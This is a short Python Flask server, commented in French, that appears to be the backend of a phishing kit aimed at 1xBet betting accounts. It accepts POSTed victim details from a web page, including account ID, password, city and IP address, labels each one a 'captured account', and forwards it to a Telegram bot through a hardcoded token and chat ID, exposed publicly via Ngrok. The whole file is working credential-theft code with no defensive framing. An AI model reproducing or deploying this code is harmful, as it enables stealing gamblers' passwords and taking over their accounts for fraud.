from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import datetime

app = Flask(__name__)
# Autorise toutes les origines pour que ton site GitHub puisse parler à ton Termux
CORS(app)

TOKEN = "6979576051:AAGB_RAKRKORo-3jkv13XRHWhandRY240fc"
CHAT_ID = "6537215671"

@app.route('/send', methods=['POST'])
def send_to_telegram():
    try:
        data = request.json
        # Récupère l'IP réelle de l'utilisateur
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        now = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        
        message = (
            f"🎯 *NOUVEAU COMPTE CAPTURÉ*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"📅 Date : {now}\n"
            f"👤 Nom : {data.get('nom')}\n"
            f"🆔 ID 1xBet : `{data.get('id')}`\n"
            f"🎮 Jeu : {data.get('jeu')}\n"
            f"🔑 Pass : `{data.get('pass')}`\n"
            f"📍 Ville : {data.get('ville')}\n"
            f"🌐 IP : {user_ip}\n"
            f"💰 Solde : > 10.000 FC (Vérifié)\n"
            f"━━━━━━━━━━━━━━━━━━"
        )
        
        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
        
        requests.post(url, json=payload)
        print(f"✅ Données reçues de : {data.get('nom')} ({user_ip})")
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"❌ Erreur : {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    # On écoute sur 0.0.0.0 pour accepter les connexions externes via Ngrok
    print("🚀 SERVEUR INTERNATIONAL ACTIF")
    print("📢 En attente de données...")
    app.run(host='0.0.0.0', port=5000)
